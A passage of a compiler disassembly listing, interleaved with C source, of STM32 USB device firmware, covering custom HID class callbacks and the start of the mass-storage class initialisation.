 8008c64:	711a      	strb	r2, [r3, #4]
 8008c66:	2200      	movs	r2, #0
 8008c68:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008c6a:	68bb      	ldr	r3, [r7, #8]
 8008c6c:	2205      	movs	r2, #5
 8008c6e:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008c70:	687b      	ldr	r3, [r7, #4]
 8008c72:	2229      	movs	r2, #41	; 0x29
 8008c74:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008c76:	4b02      	ldr	r3, [pc, #8]	; (8008c80 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008c78:	4618      	mov	r0, r3
 8008c7a:	3710      	adds	r7, #16
 8008c7c:	46bd      	mov	sp, r7
 8008c7e:	bd80      	pop	{r7, pc}
 8008c80:	20000064 	.word	0x20000064

08008c84 <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008c84:	b580      	push	{r7, lr}
 8008c86:	b084      	sub	sp, #16
 8008c88:	af00      	add	r7, sp, #0
 8008c8a:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008c8c:	2181      	movs	r1, #129	; 0x81
 8008c8e:	4815      	ldr	r0, [pc, #84]	; (8008ce4 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008c90:	f002 fd00 	bl	800b694 <USBD_GetEpDesc>
 8008c94:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008c96:	2101      	movs	r1, #1
 8008c98:	4812      	ldr	r0, [pc, #72]	; (8008ce4 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008c9a:	f002 fcfb 	bl	800b694 <USBD_GetEpDesc>
 8008c9e:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008ca0:	68fb      	ldr	r3, [r7, #12]
 8008ca2:	2b00      	cmp	r3, #0
 8008ca4:	d009      	beq.n	8008cba <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008ca6:	68fb      	ldr	r3, [r7, #12]
 8008ca8:	2200      	movs	r2, #0
 8008caa:	f042 0202 	orr.w	r2, r2, #2
 8008cae:	711a      	strb	r2, [r3, #4]
 8008cb0:	2200      	movs	r2, #0
 8008cb2:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008cb4:	68fb      	ldr	r3, [r7, #12]
 8008cb6:	2205      	movs	r2, #5
 8008cb8:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008cba:	68bb      	ldr	r3, [r7, #8]
 8008cbc:	2b00      	cmp	r3, #0
 8008cbe:	d009      	beq.n	8008cd4 <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008cc0:	68bb      	ldr	r3, [r7, #8]
 8008cc2:	2200      	movs	r2, #0
 8008cc4:	f042 0202 	orr.w	r2, r2, #2
 8008cc8:	711a      	strb	r2, [r3, #4]
 8008cca:	2200      	movs	r2, #0
 8008ccc:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008cce:	68bb      	ldr	r3, [r7, #8]
 8008cd0:	2205      	movs	r2, #5
 8008cd2:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008cd4:	687b      	ldr	r3, [r7, #4]
 8008cd6:	2229      	movs	r2, #41	; 0x29
 8008cd8:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008cda:	4b02      	ldr	r3, [pc, #8]	; (8008ce4 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008cdc:	4618      	mov	r0, r3
 8008cde:	3710      	adds	r7, #16
 8008ce0:	46bd      	mov	sp, r7
 8008ce2:	bd80      	pop	{r7, pc}
 8008ce4:	20000064 	.word	0x20000064

08008ce8 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008ce8:	b580      	push	{r7, lr}
 8008cea:	b084      	sub	sp, #16
 8008cec:	af00      	add	r7, sp, #0
 8008cee:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008cf0:	2181      	movs	r1, #129	; 0x81
 8008cf2:	4815      	ldr	r0, [pc, #84]	; (8008d48 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008cf4:	f002 fcce 	bl	800b694 <USBD_GetEpDesc>
 8008cf8:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008cfa:	2101      	movs	r1, #1
 8008cfc:	4812      	ldr	r0, [pc, #72]	; (8008d48 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008cfe:	f002 fcc9 	bl	800b694 <USBD_GetEpDesc>
 8008d02:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008d04:	68fb      	ldr	r3, [r7, #12]
 8008d06:	2b00      	cmp	r3, #0
 8008d08:	d009      	beq.n	8008d1e <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008d0a:	68fb      	ldr	r3, [r7, #12]
 8008d0c:	2200      	movs	r2, #0
 8008d0e:	f042 0202 	orr.w	r2, r2, #2
 8008d12:	711a      	strb	r2, [r3, #4]
 8008d14:	2200      	movs	r2, #0
 8008d16:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008d18:	68fb      	ldr	r3, [r7, #12]
 8008d1a:	2205      	movs	r2, #5
 8008d1c:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008d1e:	68bb      	ldr	r3, [r7, #8]
 8008d20:	2b00      	cmp	r3, #0
 8008d22:	d009      	beq.n	8008d38 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008d24:	68bb      	ldr	r3, [r7, #8]
 8008d26:	2200      	movs	r2, #0
 8008d28:	f042 0202 	orr.w	r2, r2, #2
 8008d2c:	711a      	strb	r2, [r3, #4]
 8008d2e:	2200      	movs	r2, #0
 8008d30:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008d32:	68bb      	ldr	r3, [r7, #8]
 8008d34:	2205      	movs	r2, #5
 8008d36:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008d38:	687b      	ldr	r3, [r7, #4]
 8008d3a:	2229      	movs	r2, #41	; 0x29
 8008d3c:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008d3e:	4b02      	ldr	r3, [pc, #8]	; (8008d48 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008d40:	4618      	mov	r0, r3
 8008d42:	3710      	adds	r7, #16
 8008d44:	46bd      	mov	sp, r7
 8008d46:	bd80      	pop	{r7, pc}
 8008d48:	20000064 	.word	0x20000064

08008d4c <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008d4c:	b480      	push	{r7}
 8008d4e:	b083      	sub	sp, #12
 8008d50:	af00      	add	r7, sp, #0
 8008d52:	6078      	str	r0, [r7, #4]
 8008d54:	460b      	mov	r3, r1
 8008d56:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008d58:	687b      	ldr	r3, [r7, #4]
 8008d5a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d5e:	687b      	ldr	r3, [r7, #4]
 8008d60:	32b0      	adds	r2, #176	; 0xb0
 8008d62:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008d66:	2200      	movs	r2, #0
 8008d68:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008d6c:	2300      	movs	r3, #0
}
 8008d6e:	4618      	mov	r0, r3
 8008d70:	370c      	adds	r7, #12
 8008d72:	46bd      	mov	sp, r7
 8008d74:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008d78:	4770      	bx	lr

08008d7a <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008d7a:	b580      	push	{r7, lr}
 8008d7c:	b084      	sub	sp, #16
 8008d7e:	af00      	add	r7, sp, #0
 8008d80:	6078      	str	r0, [r7, #4]
 8008d82:	460b      	mov	r3, r1
 8008d84:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008d86:	687b      	ldr	r3, [r7, #4]
 8008d88:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d8c:	687b      	ldr	r3, [r7, #4]
 8008d8e:	32b0      	adds	r2, #176	; 0xb0
 8008d90:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008d94:	2b00      	cmp	r3, #0
 8008d96:	d101      	bne.n	8008d9c <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008d98:	2303      	movs	r3, #3
 8008d9a:	e017      	b.n	8008dcc <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008d9c:	687b      	ldr	r3, [r7, #4]
 8008d9e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008da2:	687b      	ldr	r3, [r7, #4]
 8008da4:	32b0      	adds	r2, #176	; 0xb0
 8008da6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008daa:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008dac:	687b      	ldr	r3, [r7, #4]
 8008dae:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008db2:	687a      	ldr	r2, [r7, #4]
 8008db4:	33b0      	adds	r3, #176	; 0xb0
 8008db6:	009b      	lsls	r3, r3, #2
 8008db8:	4413      	add	r3, r2
 8008dba:	685b      	ldr	r3, [r3, #4]
 8008dbc:	68db      	ldr	r3, [r3, #12]
 8008dbe:	68fa      	ldr	r2, [r7, #12]
 8008dc0:	7810      	ldrb	r0, [r2, #0]
 8008dc2:	68fa      	ldr	r2, [r7, #12]
 8008dc4:	7852      	ldrb	r2, [r2, #1]
 8008dc6:	4611      	mov	r1, r2
 8008dc8:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008dca:	2300      	movs	r3, #0
}
 8008dcc:	4618      	mov	r0, r3
 8008dce:	3710      	adds	r7, #16
 8008dd0:	46bd      	mov	sp, r7
 8008dd2:	bd80      	pop	{r7, pc}

08008dd4 <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008dd4:	b580      	push	{r7, lr}
 8008dd6:	b084      	sub	sp, #16
 8008dd8:	af00      	add	r7, sp, #0
 8008dda:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008ddc:	687b      	ldr	r3, [r7, #4]
 8008dde:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008de2:	687b      	ldr	r3, [r7, #4]
 8008de4:	32b0      	adds	r2, #176	; 0xb0
 8008de6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008dea:	2b00      	cmp	r3, #0
 8008dec:	d101      	bne.n	8008df2 <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008dee:	2303      	movs	r3, #3
 8008df0:	e01c      	b.n	8008e2c <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008df2:	687b      	ldr	r3, [r7, #4]
 8008df4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008df8:	687b      	ldr	r3, [r7, #4]
 8008dfa:	32b0      	adds	r2, #176	; 0xb0
 8008dfc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e00:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008e02:	4b0c      	ldr	r3, [pc, #48]	; (8008e34 <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008e04:	7819      	ldrb	r1, [r3, #0]
 8008e06:	68fa      	ldr	r2, [r7, #12]
 8008e08:	230f      	movs	r3, #15
 8008e0a:	6878      	ldr	r0, [r7, #4]
 8008e0c:	f004 f920 	bl	800d050 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008e10:	68fb      	ldr	r3, [r7, #12]
 8008e12:	781a      	ldrb	r2, [r3, #0]
 8008e14:	4b08      	ldr	r3, [pc, #32]	; (8008e38 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008e16:	701a      	strb	r2, [r3, #0]
 8008e18:	4b07      	ldr	r3, [pc, #28]	; (8008e38 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008e1a:	781b      	ldrb	r3, [r3, #0]
 8008e1c:	f003 0302 	and.w	r3, r3, #2
 8008e20:	2b02      	cmp	r3, #2
 8008e22:	d002      	beq.n	8008e2a <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008e24:	4b05      	ldr	r3, [pc, #20]	; (8008e3c <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008e26:	2201      	movs	r2, #1
 8008e28:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008e2a:	2300      	movs	r3, #0
}
 8008e2c:	4618      	mov	r0, r3
 8008e2e:	3710      	adds	r7, #16
 8008e30:	46bd      	mov	sp, r7
 8008e32:	bd80      	pop	{r7, pc}
 8008e34:	200000a7 	.word	0x200000a7
 8008e38:	2000026c 	.word	0x2000026c
 8008e3c:	20000270 	.word	0x20000270

08008e40 <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008e40:	b580      	push	{r7, lr}
 8008e42:	b084      	sub	sp, #16
 8008e44:	af00      	add	r7, sp, #0
 8008e46:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008e48:	687b      	ldr	r3, [r7, #4]
 8008e4a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e4e:	687b      	ldr	r3, [r7, #4]
 8008e50:	32b0      	adds	r2, #176	; 0xb0
 8008e52:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e56:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008e58:	68fb      	ldr	r3, [r7, #12]
 8008e5a:	2b00      	cmp	r3, #0
 8008e5c:	d101      	bne.n	8008e62 <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008e5e:	2303      	movs	r3, #3
 8008e60:	e016      	b.n	8008e90 <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008e62:	68fb      	ldr	r3, [r7, #12]
 8008e64:	69db      	ldr	r3, [r3, #28]
 8008e66:	2b01      	cmp	r3, #1
 8008e68:	d111      	bne.n	8008e8e <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008e6a:	687b      	ldr	r3, [r7, #4]
 8008e6c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008e70:	687a      	ldr	r2, [r7, #4]
 8008e72:	33b0      	adds	r3, #176	; 0xb0
 8008e74:	009b      	lsls	r3, r3, #2
 8008e76:	4413      	add	r3, r2
 8008e78:	685b      	ldr	r3, [r3, #4]
 8008e7a:	68db      	ldr	r3, [r3, #12]
 8008e7c:	68fa      	ldr	r2, [r7, #12]
 8008e7e:	7810      	ldrb	r0, [r2, #0]
 8008e80:	68fa      	ldr	r2, [r7, #12]
 8008e82:	7852      	ldrb	r2, [r2, #1]
 8008e84:	4611      	mov	r1, r2
 8008e86:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008e88:	68fb      	ldr	r3, [r7, #12]
 8008e8a:	2200      	movs	r2, #0
 8008e8c:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008e8e:	2300      	movs	r3, #0
}
 8008e90:	4618      	mov	r0, r3
 8008e92:	3710      	adds	r7, #16
 8008e94:	46bd      	mov	sp, r7
 8008e96:	bd80      	pop	{r7, pc}

08008e98 <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008e98:	b480      	push	{r7}
 8008e9a:	b083      	sub	sp, #12
 8008e9c:	af00      	add	r7, sp, #0
 8008e9e:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008ea0:	687b      	ldr	r3, [r7, #4]
 8008ea2:	220a      	movs	r2, #10
 8008ea4:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008ea6:	4b03      	ldr	r3, [pc, #12]	; (8008eb4 <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008ea8:	4618      	mov	r0, r3
 8008eaa:	370c      	adds	r7, #12
 8008eac:	46bd      	mov	sp, r7
 8008eae:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008eb2:	4770      	bx	lr
 8008eb4:	2000009c 	.word	0x2000009c

08008eb8 <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008eb8:	b480      	push	{r7}
 8008eba:	b083      	sub	sp, #12
 8008ebc:	af00      	add	r7, sp, #0
 8008ebe:	6078      	str	r0, [r7, #4]
 8008ec0:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008ec2:	683b      	ldr	r3, [r7, #0]
 8008ec4:	2b00      	cmp	r3, #0
 8008ec6:	d101      	bne.n	8008ecc <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008ec8:	2303      	movs	r3, #3
 8008eca:	e009      	b.n	8008ee0 <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008ecc:	687b      	ldr	r3, [r7, #4]
 8008ece:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008ed2:	687a      	ldr	r2, [r7, #4]
 8008ed4:	33b0      	adds	r3, #176	; 0xb0
 8008ed6:	009b      	lsls	r3, r3, #2
 8008ed8:	4413      	add	r3, r2
 8008eda:	683a      	ldr	r2, [r7, #0]
 8008edc:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008ede:	2300      	movs	r3, #0
}
 8008ee0:	4618      	mov	r0, r3
 8008ee2:	370c      	adds	r7, #12
 8008ee4:	46bd      	mov	sp, r7
 8008ee6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008eea:	4770      	bx	lr

08008eec <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008eec:	b580      	push	{r7, lr}
 8008eee:	b084      	sub	sp, #16
 8008ef0:	af00      	add	r7, sp, #0
 8008ef2:	6078      	str	r0, [r7, #4]
 8008ef4:	460b      	mov	r3, r1
 8008ef6:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008ef8:	f241 0074 	movw	r0, #4212	; 0x1074
 8008efc:	f004 f938 	bl	800d170 <USBD_static_malloc_MSC>
 8008f00:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008f02:	68fb      	ldr	r3, [r7, #12]
 8008f04:	2b00      	cmp	r3, #0
 8008f06:	d109      	bne.n	8008f1c <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008f08:	687b      	ldr	r3, [r7, #4]
 8008f0a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f0e:	687b      	ldr	r3, [r7, #4]
 8008f10:	32b0      	adds	r2, #176	; 0xb0
 8008f12:	2100      	movs	r1, #0
 8008f14:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008f18:	2302      	movs	r3, #2
 8008f1a:	e06e      	b.n	8008ffa <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008f1c:	687b      	ldr	r3, [r7, #4]
 8008f1e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f22:	687b      	ldr	r3, [r7, #4]
 8008f24:	32b0      	adds	r2, #176	; 0xb0
 8008f26:	68f9      	ldr	r1, [r7, #12]
 8008f28:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008f2c:	687b      	ldr	r3, [r7, #4]
 8008f2e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f32:	687b      	ldr	r3, [r7, #4]
 8008f34:	32b0      	adds	r2, #176	; 0xb0
 8008f36:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008f3a:	687b      	ldr	r3, [r7, #4]
 8008f3c:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008f40:	687b      	ldr	r3, [r7, #4]
 8008f42:	7c1b      	ldrb	r3, [r3, #16]
 8008f44:	2b00      	cmp	r3, #0
 8008f46:	d12b      	bne.n	8008fa0 <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008f48:	4b2e      	ldr	r3, [pc, #184]	; (8009004 <USBD_MSC_Init+0x118>)
 8008f4a:	7819      	ldrb	r1, [r3, #0]
 8008f4c:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008f50:	2202      	movs	r2, #2
 8008f52:	6878      	ldr	r0, [r7, #4]
 8008f54:	f003 feca 	bl	800ccec <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008f58:	4b2a      	ldr	r3, [pc, #168]	; (8009004 <USBD_MSC_Init+0x118>)
 8008f5a:	781b      	ldrb	r3, [r3, #0]
 8008f5c:	f003 020f 	and.w	r2, r3, #15
 8008f60:	6879      	ldr	r1, [r7, #4]
 8008f62:	4613      	mov	r3, r2
 8008f64:	009b      	lsls	r3, r3, #2
 8008f66:	4413      	add	r3, r2
 8008f68:	009b      	lsls	r3, r3, #2
 8008f6a:	440b      	add	r3, r1
 8008f6c:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008f70:	2201      	movs	r2, #1
 8008f72:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008f74:	4b24      	ldr	r3, [pc, #144]	; (8009008 <USBD_MSC_Init+0x11c>)
 8008f76:	7819      	ldrb	r1, [r3, #0]
 8008f78:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008f7c:	2202      	movs	r2, #2
 8008f7e:	6878      	ldr	r0, [r7, #4]
 8008f80:	f003 feb4 	bl	800ccec <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008f84:	4b20      	ldr	r3, [pc, #128]	; (8009008 <USBD_MSC_Init+0x11c>)
 8008f86:	781b      	ldrb	r3, [r3, #0]
 8008f88:	f003 020f 	and.w	r2, r3, #15
 8008f8c:	6879      	ldr	r1, [r7, #4]
 8008f8e:	4613      	mov	r3, r2
 8008f90:	009b      	lsls	r3, r3, #2
 8008f92:	4413      	add	r3, r2
 8008f94:	009b      	lsls	r3, r3, #2
 8008f96:	440b      	add	r3, r1
 8008f98:	3324      	adds	r3, #36	; 0x24
 8008f9a:	2201      	movs	r2, #1
 8008f9c:	801a      	strh	r2, [r3, #0]
 8008f9e:	e028      	b.n	8008ff2 <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008fa0:	4b18      	ldr	r3, [pc, #96]	; (8009004 <USBD_MSC_Init+0x118>)
 8008fa2:	7819      	ldrb	r1, [r3, #0]
 8008fa4:	2340      	movs	r3, #64	; 0x40
 8008fa6:	2202      	movs	r2, #2
 8008fa8:	6878      	ldr	r0, [r7, #4]
 8008faa:	f003 fe9f 	bl	800ccec <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008fae:	4b15      	ldr	r3, [pc, #84]	; (8009004 <USBD_MSC_Init+0x118>)
 8008fb0:	781b      	ldrb	r3, [r3, #0]
 8008fb2:	f003 020f 	and.w	r2, r3, #15
 8008fb6:	6879      	ldr	r1, [r7, #4]
 8008fb8:	4613      	mov	r3, r2
 8008fba:	009b      	lsls	r3, r3, #2
 8008fbc:	4413      	add	r3, r2
 8008fbe:	009b      	lsls	r3, r3, #2
 8008fc0:	440b      	add	r3, r1
 8008fc2:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008fc6:	2201      	movs	r2, #1
 8008fc8:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
